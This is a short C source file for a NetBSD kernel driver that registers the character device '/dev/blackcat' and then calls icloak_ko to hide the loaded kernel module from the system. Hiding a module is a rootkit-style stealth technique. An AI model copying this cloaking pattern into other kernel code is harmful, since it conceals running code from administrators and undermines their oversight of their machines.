/*
 *                          Copyright (C) 2018 by Rafael Santiago
 *
 * Use of this source code is governed by GPL-v2 license that can
 * be found in the COPYING file.
 *
 */
#include <netbsd/cdev_init.h>
#include <netbsd/cdev_deinit.h>
#include <icloak.h>

int cdev_init(void) {
    int errno = 0;
    int bmajor = -1, cmajor = 210;

    cdev_mtx_init(&g_cdev.lock);

    if ((errno = devsw_attach(CDEVNAME, NULL, &bmajor, &blackcat_cdevsw, &cmajor)) != 0) {
        cdev_mtx_deinit(&g_cdev.lock);
    }

    if (icloak_ko(CDEVNAME) != 0) {
        uprintf("/dev/blackcat: Unable to hide the kernel module.\n");
        cdev_deinit();
        return 1;
    }

    return errno;
}
